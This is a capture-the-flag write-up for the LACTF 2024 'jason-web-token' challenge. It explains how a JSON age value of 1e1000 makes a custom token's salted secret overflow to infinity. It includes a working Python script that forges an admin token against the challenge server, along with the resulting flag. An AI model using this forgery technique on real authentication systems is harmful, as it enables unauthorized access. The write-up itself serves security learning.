---
title: jason-web-token
date: 2024-02-19 08:07
tags: 
- web
- py
- author-hartmannsyg
categories: LACTF 2024
---

written by {% person hartmannsyg %}

(I didn't manage to solve this, but we did try putting in huge numbers to no avail. The key was that python parses 1e1000 as an int despite treating it like a float when it comes to actual operations)

This is a custom implementation of tokens similar to the normal JSON web tokens. Let's see the decode token:

```py
def decode_token(token):
    if not token:
        return None, "invalid token: please log in"

    datahex, signature = token.split(".")
    data = bytes.fromhex(datahex).decode()
    userinfo = json.loads(data)
    salted_secret = (secret ^ userinfo["timestamp"]) + userinfo["age"]

    if hash_(f"{data}:{salted_secret}") != signature:
        return None, "invalid token: signature did not match data"
    return userinfo, None
```
the vulnerability here is that if you can make `userinfo["age"]` large enough, salted_secret = inf:
```python
>>> import os
>>> import time
>>> secret = int.from_bytes(os.urandom(128), "big")
>>> secret
4011952375692945687496817245441685307048886621404697235569537713667686161070415037253779930038198895268608425595939277182765910221141137710514755888000270533259466222246741009356066524650748556296726349989472176270636392199394983521282136751830998122883086844853072017401645675862171032499976402033057475140
>>> timestamp = int(time.time())
>>> timestamp
1708322006
>>> salted_secret = (secret ^ timestamp) + 1e1000
>>> salted_secret
inf
```

So if our forged jwt's `userinfo["age"]` is large enough, we can force `salted_secret` to be "inf".
This means the signature will effectively be:
```py
hash_(f"{data}:inf")
```

so we can create a forged "jwt" and send it to /img for the flag:
```py
import requests
import hashlib
hash_ = lambda a: hashlib.sha256(a.encode()).hexdigest()

data = '{"username": "hartmannsyg", "age": 1e1000, "role": "admin", "timestamp": 1708322006}'
jwt = data.encode().hex() + "." + hash_(f"{data}:inf") # (secret^timestamp) + 1e1000 gets converted to inf
print("jwt: " + jwt)

res = requests.get('https://jwt.chall.lac.tf/img',cookies={"token":jwt})
print(res.text)
```

{% ccb terminal:true wrapped:true %}
jwt: 7b22757365726e616d65223a2022686172746d616e6e737967222c2022616765223a203165313030302c2022726f6c65223a202261646d696e222c202274696d657374616d70223a20313730383332323030367d.503e495a02ba3c8a54ed442728f1b13438c51a8136634ab3718eafc0c241096e
{"msg":"Your flag is lactf{pr3v3nt3d_th3_d0s_bu7_47_wh3_c0st}\n","img":"/static/bplet.png"}
{% endccb %}

